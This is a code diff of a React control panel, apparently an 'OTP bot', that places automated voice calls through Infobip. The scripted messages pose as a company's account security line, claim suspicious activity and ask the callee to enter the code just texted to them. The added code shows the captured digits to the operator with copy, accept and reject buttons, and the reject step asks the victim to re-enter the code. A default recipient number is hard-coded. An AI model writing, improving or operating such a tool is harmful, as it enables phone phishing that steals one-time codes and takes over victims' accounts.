@@ -6,7 +6,6 @@ import {
   Phone, 
   PhoneOff, 
   Settings, 
-  MessageSquare, 
   Layers, 
   Trash2,
   Volume2,
@@ -18,7 +17,11 @@ import {
   History,
   CheckCircle,
   XCircle,
-  Clock
+  Clock,
+  Copy,
+  Check,
+  ThumbsUp,
+  ThumbsDown
 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -54,6 +57,15 @@ const CALL_TYPES = [
   { id: "custom", name: "Custom Script" },
 ];
 
+// Default step messages
+const DEFAULT_STEPS = {
+  step1: "Hello {name}, This is the {service} account service prevention line. This automated call was made due to suspicious activity on your account. We have received a request to change your password. If it was not you press 1, if it was you press 0.",
+  step2: "Thank you for your confirmation, to block this request. Please enter the {digits}-digit security code that we sent to your phone number.",
+  step3: "Thank you. Please hold for a moment while we verify your code.",
+  accepted: "Thank you for waiting. We will get back to you if we need further information thank you for your attention. Goodbye.",
+  rejected: "Thank you for waiting, the verification code you entered previously is incorrect. Please make sure you enter the correct code. Please enter {digits}-digit security code that we sent to your phone number.",
+};
+
 function App() {
   // Infobip config state
   const [infobipConfigured, setInfobipConfigured] = useState(false);
@@ -62,41 +74,27 @@ function App() {
   const [callType, setCallType] = useState("login_verification");
   const [voiceModel, setVoiceModel] = useState("hera");
   const [fromNumber, setFromNumber] = useState("+18085821342");
-  const [recipientNumber, setRecipientNumber] = useState("");
+  const [recipientNumber, setRecipientNumber] = useState("+525547000906");
   const [recipientName, setRecipientName] = useState("");
   const [serviceName, setServiceName] = useState("");
   const [otpDigits, setOtpDigits] = useState("6");
 
-  // Messages state
-  const [greetings, setGreetings] = useState(
-    "Hello {name}, This is the {service} account service prevention line. This automated call was made due to suspicious activity on your account."
-  );
-  const [prompt, setPrompt] = useState(
-    "Thank you for your confirmation. Please enter the {digits}-digit security code that we sent to your phone number."
-  );
-  const [retryMessage, setRetryMessage] = useState(
-    "Thank you for waiting. The verification code you entered previously is incorrect. Please make sure you enter the correct code."
-  );
-  const [endMessage, setEndMessage] = useState(
-    "Thank you for waiting. We will get back to you if we need further information. Thank you for your attention. Goodbye."
-  );
-
   // Call steps state
-  const [activeStep, setActiveStep] = useState("rejected");
-  const [stepMessages, setStepMessages] = useState({
-    step1: "",
-    step2: "",
-    step3: "",
-    accepted: "",
-    rejected: retryMessage,
-  });
+  const [activeStep, setActiveStep] = useState("step1");
+  const [stepMessages, setStepMessages] = useState(DEFAULT_STEPS);
 
   // Call state
   const [isCallActive, setIsCallActive] = useState(false);
   const [currentCallId, setCurrentCallId] = useState(null);
   const [callStatus, setCallStatus] = useState("IDLE");
+  const [currentStep, setCurrentStep] = useState("");
   const [logs, setLogs] = useState([]);
   const [isLoading, setIsLoading] = useState(false);
+  
+  // DTMF state
+  const [dtmfCode, setDtmfCode] = useState(null);
+  const [copiedCode, setCopiedCode] = useState(false);
+  const [showVerifyButtons, setShowVerifyButtons] = useState(false);
   
   // Call history state
   const [callHistory, setCallHistory] = useState([]);
@@ -146,6 +144,31 @@ function App() {
     }
   }, []);
 
+  // Copy DTMF code to clipboard
+  const copyToClipboard = async (code) => {
+    try {
+      await navigator.clipboard.writeText(code);
+      setCopiedCode(true);
+      toast.success("Code copied to clipboard!");
+      setTimeout(() => setCopiedCode(false), 2000);
+    } catch (e) {
+      toast.error("Failed to copy");
+    }
+  };
+
+  // Verify code (accept/reject)
+  const handleVerify = async (accepted) => {
+    if (!currentCallId) return;
+    
+    try {
+      await axios.post(`${API}/calls/${currentCallId}/verify`, { accepted });
+      setShowVerifyButtons(false);
+      toast.success(accepted ? "Code accepted" : "Code rejected");
+    } catch (e) {
+      toast.error("Verification failed");
+    }
+  };
+
   // Subscribe to SSE events
   const subscribeToEvents = useCallback((callId) => {
     if (eventSourceRef.current) {
@@ -169,30 +192,42 @@ function App() {
         // Add to logs
         setLogs((prev) => [...prev, data]);
 
-        // Update call status based on event
+        // Handle DTMF code
+        if (data.dtmf_code && data.event_type === "DTMF_CODE_RECEIVED") {
+          setDtmfCode(data.dtmf_code);
+          setShowVerifyButtons(true);
+        }
+
+        // Update call status and step
         if (data.event_type) {
+          // Update current step
+          if (data.event_type.includes("STEP1")) setCurrentStep("step1");
+          else if (data.event_type.includes("STEP2")) setCurrentStep("step2");
+          else if (data.event_type.includes("STEP3")) setCurrentStep("step3");
+          else if (data.event_type.includes("ACCEPTED")) setCurrentStep("accepted");
+          else if (data.event_type.includes("REJECTED")) setCurrentStep("rejected");
+          
           const statusMap = {
             CALL_QUEUED: "PENDING",
             CALL_INITIATED: "CALLING",
             CALL_RINGING: "RINGING",
+            CALL_ANSWERED: "ESTABLISHED",
             CALL_ESTABLISHED: "ESTABLISHED",
             CALL_FINISHED: "FINISHED",
             CALL_FAILED: "FAILED",
             CALL_HANGUP: "FINISHED",
-            STATUS_DELIVERED: "FINISHED",
-            STATUS_REJECTED: "FAILED",
-            STATUS_UNDELIVERABLE: "FAILED",
+            VERIFICATION_ACCEPTED: "FINISHED",
+            VERIFICATION_REJECTED: "FINISHED",
           };
           
           const newStatus = statusMap[data.event_type];
           if (newStatus) {
             setCallStatus(newStatus);
             
-            // End call on finished/failed
             if (["FINISHED", "FAILED"].includes(newStatus)) {
               setIsCallActive(false);
+              setShowVerifyButtons(false);
               eventSource.close();
-              // Refresh call history
               fetchCallHistory();
             }
           }
@@ -216,6 +251,9 @@ function App() {
     }
 
     setIsLoading(true);
+    setDtmfCode(null);
+    setShowVerifyButtons(false);
+    setCurrentStep("");
     
     try {
       const response = await axios.post(`${API}/calls/initiate`, {
@@ -228,12 +266,6 @@ function App() {
           service_name: serviceName,
           otp_digits: parseInt(otpDigits),
         },
-        messages: {
-          greetings: greetings.replace("{name}", recipientName).replace("{service}", serviceName),
-          prompt: prompt.replace("{digits}", otpDigits),
-          retry: retryMessage.replace("{digits}", otpDigits),
-          end_message: endMessage,
-        },
         steps: stepMessages,
       });
 
@@ -242,10 +274,9 @@ function App() {
       setIsCallActive(true);
       setCallStatus("PENDING");
       
-      // Subscribe to events
       subscribeToEvents(call_id);
       
-      toast.success(using_infobip ? "Call initiated via Infobip" : "Call initiated (simulation mode)");
+      toast.success(using_infobip ? "IVR call initiated via Infobip" : "IVR call initiated (simulation mode)");
     } catch (error) {
       console.error("Error starting call:", error);
       toast.error(error.response?.data?.detail || "Failed to start call");
@@ -264,6 +295,7 @@ function App() {
       await axios.post(`${API}/calls/${currentCallId}/hangup`);
       setIsCallActive(false);
       setCallStatus("FINISHED");
+      setShowVerifyButtons(false);
       
       if (eventSourceRef.current) {
         eventSourceRef.current.close();
@@ -282,10 +314,12 @@ function App() {
   // Clear logs
   const handleClearLogs = () => {
     setLogs([]);
-    // Also reset call state if no active call
+    setDtmfCode(null);
+    setShowVerifyButtons(false);
     if (!isCallActive) {
       setCurrentCallId(null);
       setCallStatus("IDLE");
+      setCurrentStep("");
     }
     toast.success("Logs cleared");
   };
@@ -331,6 +365,21 @@ function App() {
     if (status === "FINISHED") return <CheckCircle className="w-4 h-4 text-emerald-400" />;
     if (status === "FAILED") return <XCircle className="w-4 h-4 text-red-400" />;
     return <Clock className="w-4 h-4 text-yellow-400" />;
+  };
+
+  // Get event icon
+  const getEventIcon = (eventType) => {
+    if (eventType.includes("DTMF")) return "🔢";
+    if (eventType.includes("STEP1")) return "1️⃣";
+    if (eventType.includes("STEP2")) return "2️⃣";
+    if (eventType.includes("STEP3")) return "3️⃣";
+    if (eventType.includes("ACCEPTED")) return "✅";
+    if (eventType.includes("REJECTED")) return "❌";
+    if (eventType.includes("RINGING")) return "📞";
+    if (eventType.includes("ANSWERED") || eventType.includes("ESTABLISHED")) return "📱";
+    if (eventType.includes("FINISHED")) return "🏁";
+    if (eventType.includes("FAILED")) return "⚠️";
+    return "📌";
   };
 
   return (
@@ -401,6 +450,11 @@ function App() {
                             <span className="font-mono text-xs text-slate-300">
                               {call.config?.recipient_number || "Unknown"}
                             </span>
+                            {call.dtmf_code && (
+                              <Badge variant="outline" className="text-xs bg-cyan-500/10 text-cyan-400 border-cyan-500/30">
+                                Code: {call.dtmf_code}
+                              </Badge>
+                            )}
                           </div>
                           <span className="font-mono text-xs text-slate-500">
                             {formatDateTime(call.created_at)}
@@ -409,6 +463,66 @@ function App() {
                       ))}
                     </div>
                   )}
+                </div>
+              </motion.div>
+            )}
+          </AnimatePresence>
+          
+          {/* DTMF Code Display */}
+          <AnimatePresence>
+            {dtmfCode && (
+              <motion.div
+                initial={{ height: 0, opacity: 0 }}
+                animate={{ height: "auto", opacity: 1 }}
+                exit={{ height: 0, opacity: 0 }}
+                className="border-b border-white/5"
+              >
+                <div className="p-4 bg-emerald-500/10">
+                  <div className="flex items-center justify-between">
+                    <div>
+                      <span className="font-mono text-xs text-emerald-400/70 uppercase tracking-wider">
+                        Security Code Received
+                      </span>
+                      <div className="flex items-center gap-3 mt-2">
+                        <span className="font-mono text-2xl text-emerald-400 tracking-widest" data-testid="dtmf-code">
+                          {dtmfCode}
+                        </span>
+                        <Button
+                          variant="ghost"
+                          size="sm"
+                          onClick={() => copyToClipboard(dtmfCode)}
+                          className="text-emerald-400 hover:text-emerald-300 hover:bg-emerald-500/10"
+                          data-testid="copy-code-btn"
+                        >
+                          {copiedCode ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
+                        </Button>
+                      </div>
+                    </div>
+                    
+                    {/* Verify Buttons */}
+                    {showVerifyButtons && (
+                      <div className="flex gap-2">
+                        <Button
+                          size="sm"
+                          onClick={() => handleVerify(true)}
+                          className="bg-emerald-500/20 text-emerald-400 border-emerald-500/30 hover:bg-emerald-500/30"
+                          data-testid="accept-btn"
+                        >
+                          <ThumbsUp className="w-4 h-4 mr-1" />
+                          Accept
+                        </Button>
+                        <Button
+                          size="sm"
+                          onClick={() => handleVerify(false)}
+                          className="bg-red-500/20 text-red-400 border-red-500/30 hover:bg-red-500/30"
+                          data-testid="reject-btn"
+                        >
+                          <ThumbsDown className="w-4 h-4 mr-1" />
+                          Reject
+                        </Button>
+                      </div>
+                    )}
+                  </div>
                 </div>
               </motion.div>
             )}
@@ -427,18 +541,31 @@ function App() {
                     initial={{ opacity: 0, x: -10 }}
                     animate={{ opacity: 1, x: 0 }}
                     exit={{ opacity: 0 }}
-                    className="log-entry"
+                    className={`log-entry ${log.dtmf_code ? 'border-l-emerald-500' : ''}`}
                     data-testid={`log-entry-${index}`}
                   >
                     <div className="log-timestamp">
                       [{formatTimestamp(log.timestamp)}]
                     </div>
-                    <div className="log-event neon-text">
+                    <div className="log-event neon-text flex items-center gap-2">
+                      <span>{getEventIcon(log.event_type)}</span>
                       {log.event_type}
                     </div>
                     <div className="log-details">
                       {log.details}
                     </div>
+                    {log.dtmf_code && (
+                      <div className="mt-2 flex items-center gap-2">
+                        <Badge 
+                          variant="outline" 
+                          className="font-mono text-emerald-400 bg-emerald-500/10 border-emerald-500/30 cursor-pointer hover:bg-emerald-500/20"
+                          onClick={() => copyToClipboard(log.dtmf_code)}
+                        >
+                          {log.dtmf_code}
+                          <Copy className="w-3 h-3 ml-1" />
+                        </Badge>
+                      </div>
+                    )}
                   </motion.div>
                 ))
               )}
@@ -449,7 +576,7 @@ function App() {
 
         {/* Right Panel - Call Setup */}
         <div className="setup-panel" data-testid="setup-panel">
-          {/* Infobip Status Badge */}
+          {/* Header */}
           <div className="flex items-center justify-between mb-6">
             <h1 className="font-heading text-2xl font-bold text-white">
               Voice Bot Control
@@ -472,24 +599,22 @@ function App() {
             <div className="form-grid">
               <div>
                 <label className="form-label">Call Type</label>
-                <div className="flex gap-2">
-                  <Select value={callType} onValueChange={setCallType}>
-                    <SelectTrigger className="glass-input h-12 font-mono text-cyan-100" data-testid="call-type-select">
-                      <SelectValue />
-                    </SelectTrigger>
-                    <SelectContent className="bg-slate-900 border-slate-800">
-                      {CALL_TYPES.map((type) => (
-                        <SelectItem 
-                          key={type.id} 
-                          value={type.id}
-                          className="font-mono text-sm"
-                        >
-                          {type.name}
-                        </SelectItem>
-                      ))}
-                    </SelectContent>
-                  </Select>
-                </div>
+                <Select value={callType} onValueChange={setCallType}>
+                  <SelectTrigger className="glass-input h-12 font-mono text-cyan-100" data-testid="call-type-select">
+                    <SelectValue />
+                  </SelectTrigger>
+                  <SelectContent className="bg-slate-900 border-slate-800">
+                    {CALL_TYPES.map((type) => (
+                      <SelectItem 
+                        key={type.id} 
+                        value={type.id}
+                        className="font-mono text-sm"
+                      >
+                        {type.name}
+                      </SelectItem>
+                    ))}
+                  </SelectContent>
+                </Select>
               </div>
               
               <div>
@@ -552,7 +677,7 @@ function App() {
                   value={recipientNumber}
                   onChange={(e) => setRecipientNumber(e.target.value)}
                   className="glass-input h-12 font-mono text-cyan-100"
-                  placeholder="+14155552671"
+                  placeholder="+525547000906"
                   data-testid="recipient-number-input"
                 />
               </div>
@@ -608,60 +733,6 @@ function App() {
             </div>
           </div>
 
-          {/* Messages Section */}
-          <div className="form-section glass-panel p-6 rounded-xl mb-6" data-testid="messages-section">
-            <h3 className="section-title">
-              <MessageSquare className="w-5 h-5" />
-              Message Scripts
-            </h3>
-            
-            <div className="space-y-4">
-              <div>
-                <label className="form-label">Greetings</label>
-                <Textarea
-                  value={greetings}
-                  onChange={(e) => setGreetings(e.target.value)}
-                  className="glass-input form-textarea font-mono text-cyan-100"
-                  placeholder="Hello {name}, This is..."
-                  data-testid="greetings-textarea"
-                />
-              </div>
-              
-              <div>
-                <label className="form-label">Prompt</label>
-                <Textarea
-                  value={prompt}
-                  onChange={(e) => setPrompt(e.target.value)}
-                  className="glass-input form-textarea font-mono text-cyan-100"
-                  placeholder="Please enter the {digits}-digit code..."
-                  data-testid="prompt-textarea"
-                />
-              </div>
-              
-              <div>
-                <label className="form-label">Retry Message</label>
-                <Textarea
-                  value={retryMessage}
-                  onChange={(e) => setRetryMessage(e.target.value)}
-                  className="glass-input form-textarea font-mono text-cyan-100"
-                  placeholder="The code you entered is incorrect..."
-                  data-testid="retry-textarea"
-                />
-              </div>
-              
-              <div>
-                <label className="form-label">End Message</label>
-                <Textarea
-                  value={endMessage}
-                  onChange={(e) => setEndMessage(e.target.value)}
-                  className="glass-input form-textarea font-mono text-cyan-100"
-                  placeholder="Thank you for your time. Goodbye."
-                  data-testid="end-message-textarea"
-                />
-              </div>
-            </div>
-          </div>
-
           {/* Call Steps Configuration */}
           <div className="form-section glass-panel p-6 rounded-xl mb-6" data-testid="call-steps-section">
             <h3 className="section-title">
@@ -675,7 +746,9 @@ function App() {
                   <TabsTrigger
                     key={step}
                     value={step}
-                    className="flex-1 data-[state=active]:bg-cyan-500/10 data-[state=active]:text-cyan-400 data-[state=active]:border-cyan-500/30 border border-transparent font-mono text-xs uppercase tracking-wider"
+                    className={`flex-1 font-mono text-xs uppercase tracking-wider border border-transparent
+                      data-[state=active]:bg-cyan-500/10 data-[state=active]:text-cyan-400 data-[state=active]:border-cyan-500/30
+                      ${currentStep === step ? 'ring-2 ring-emerald-500/50' : ''}`}
                     data-testid={`step-tab-${step}`}
                   >
                     {step === "accepted" ? "Accepted" : step === "rejected" ? "Rejected" : `Step ${step.slice(-1)}`}
@@ -686,15 +759,23 @@ function App() {
               {["step1", "step2", "step3", "accepted", "rejected"].map((step) => (
                 <TabsContent key={step} value={step} className="mt-4">
                   <label className="form-label">
-                    {step === "rejected" ? "Rejected Message" : step === "accepted" ? "Accepted Message" : `Step ${step.slice(-1)} Message`}
+                    {step === "step1" && "Step 1 - Initial Greeting (DTMF: 0 or 1)"}
+                    {step === "step2" && "Step 2 - Ask for Security Code"}
+                    {step === "step3" && "Step 3 - Verification Wait"}
+                    {step === "accepted" && "Accepted - Code Valid"}
+                    {step === "rejected" && "Rejected - Code Invalid"}
                   </label>
                   <Textarea
                     value={stepMessages[step]}
                     onChange={(e) => setStepMessages({ ...stepMessages, [step]: e.target.value })}
                     className="glass-input form-textarea font-mono text-cyan-100"
-                    placeholder={`Enter message for ${step}...`}
+                    placeholder={`Enter TTS message for ${step}...`}
+                    rows={4}
                     data-testid={`step-message-${step}`}
                   />
+                  <div className="mt-2 text-xs text-slate-500 font-mono">
+                    Variables: {"{name}"}, {"{service}"}, {"{digits}"}
+                  </div>
                 </TabsContent>
               ))}
             </Tabs>
